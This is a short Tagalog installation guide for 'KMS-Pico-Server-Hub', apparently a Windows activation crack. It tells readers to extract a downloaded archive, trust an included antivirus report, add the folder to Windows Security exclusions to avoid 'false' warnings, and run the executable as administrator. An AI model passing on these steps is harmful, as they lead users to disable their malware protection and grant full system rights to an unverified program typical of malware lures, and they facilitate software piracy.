## 🛠 Hakbang-hakbang na Pag-install

### Hakbang 1 — I-download at I-extract
I-save ang `KMS-Pico-Server-Hub.zip` (~50 MB) at i-extract. **Walang password.**

### Hakbang 2 — Antivirus Scan
Buksan ang `Antivirus-Report.pdf` para makita ang resulta ng VirusTotal at Windows Defender.

### Hakbang 3 — Idagdag sa Exclusions
Idagdag ang folder sa **Windows Security → Exclusions** para maiwasan ang maling babala.

### Hakbang 4 — Patakbuhin bilang Administrator
Right-click ang `KMSPicoHub.exe` → **Run as administrator**.

### Hakbang 5 — Simulan ang Activation
Pindutin ang pangunahing pulang pindutan. Hintayin ang berdeng mensahe "Activated successfully".

### Hakbang 6 — I-verify
Buksan ang **Settings → System → About** at suriin ang status ng activation.
